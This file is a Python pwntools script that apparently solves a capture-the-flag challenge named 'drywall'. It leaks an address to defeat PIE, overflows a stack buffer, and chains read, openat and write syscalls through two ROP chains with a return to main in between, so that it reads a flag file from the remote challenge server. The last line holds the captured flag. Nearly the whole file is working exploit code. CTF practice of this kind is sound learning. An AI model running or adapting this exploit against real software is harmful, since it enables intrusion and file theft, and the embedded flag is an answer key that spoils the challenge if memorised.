#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chal", checksec=True)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b main")
p = remote("drywall.kctf-453514-codelab.kctf.cloud", 1337)

p.sendlineafter(b"H4x0r?\n", b"smiley")
p.readuntil(b";)\n")

leak = int(p.readline().decode(), 16)
elf.address = leak - elf.sym["main"]

FLAG = b"/home/user/flag.txt\x00"
SCRATCH_MEMORY = elf.address + 0x4200
FLAG_SIZE = 48

rop = ROP(elf)
rop.raw(b"A" * 0x118)

# read(0, SCRATCH_MEMORY, 128)
rop.rdi = 0
rop.rsi = SCRATCH_MEMORY
rop.rdx = 128
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# openat(-1, SCRATCH_MEMORY, O_RDONLY) => 3
rop.rdi = -1
rop.rsi = SCRATCH_MEMORY
rop.rdx = 0
rop.rax = constants.SYS_openat
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# note: that i couldn't quite fit a payload with 4x syscalls into ~300 bytes
# ... so i split it into 2x ropchains with a ret2main in the middle

rop.raw(rop.find_gadget(['ret'])[0]) # stack align
rop.raw(p64(elf.sym["main"]))

p.sendline(rop.chain())

p.sendline(FLAG)

# ... wanna see me do it again?

p.sendlineafter(b"H4x0r?\n", b"smiley")
p.readuntil(b";)\n")

rop = ROP(elf)
rop.raw(b"A" * 0x118)

# read(3, SCRATCH_MEMORY, FLAG_SIZE)
rop.rdi = 3
rop.rsi = SCRATCH_MEMORY
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# write(stdout, SCRATCH_MEMORY, FLAG_SIZE)
rop.rdi = 1
rop.rsi = SCRATCH_MEMORY
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendline(rop.chain())

p.readuntil(b"wctf{")
print("wctf{" + p.readuntil(b"}").decode()) # wctf{fL1m5y_w4LL5_br34k_f4r_7h3_31337_459827349}
